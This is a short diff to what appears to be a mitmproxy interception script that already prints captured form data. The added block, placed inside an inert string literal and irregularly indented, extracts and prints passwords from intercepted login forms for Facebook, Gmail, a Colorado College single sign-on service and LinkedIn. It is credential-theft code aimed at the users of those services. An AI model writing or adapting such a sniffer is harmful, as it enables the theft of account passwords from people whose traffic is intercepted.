@@ -22,5 +22,13 @@ def request(flow):
 		print("////////////////////////////")
 		print("form: ", form)
 
-		'''print(type(headers)) #netlib.http.headers.Headers'''
-
+		'''
+			if form['pass'] and "facebook.com" in flow.request.headers[':authority']:
+					print("account: Facebook, password:", form['pass'])
+				elif "Passwd" in form and form['Page'] == "PasswordSeparationSignIn" and "google.com" in flow.request.headers[':authority']:
+					print("account: Gmail, password:", form['Passwd'])
+				elif flow.request.headers['Host'] == "cas.coloradocollege.edu" and form['password']:
+					print("account: CC SSI, password:", form['password'])
+				elif "linkedin.com" in flow.request.headers['Host'] and form['session_password']:
+					print("account: Linkedin, password:", form['session_password'])
+		'''
